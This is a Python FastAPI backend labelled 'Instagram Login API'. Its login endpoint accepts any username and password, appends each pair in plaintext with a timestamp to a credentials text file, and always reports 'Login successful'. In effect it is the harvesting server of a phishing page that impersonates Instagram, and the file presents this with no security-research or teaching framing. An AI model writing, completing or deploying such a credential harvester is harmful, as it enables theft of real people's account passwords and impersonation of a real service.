from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import os
from datetime import datetime

app = FastAPI()

# CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allow all origins for development
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

class LoginRequest(BaseModel):
    username: str
    password: str

@app.get("/")
async def root():
    return {"message": "Instagram Login API"}

@app.post("/api/login")
async def login(request: LoginRequest):
    try:
        # Create credentials directory if it doesn't exist
        os.makedirs("/app/backend/credentials", exist_ok=True)
        
        # Append credentials to txt file
        credentials_file = "/app/backend/credentials/login_data.txt"
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(credentials_file, "a") as f:
            f.write(f"{request.username}:{request.password} - {timestamp}\n")
        
        return {"success": True, "message": "Login successful"}
    
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to save credentials: {str(e)}")

@app.get("/api/health")
async def health_check():
    return {"status": "healthy"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8001)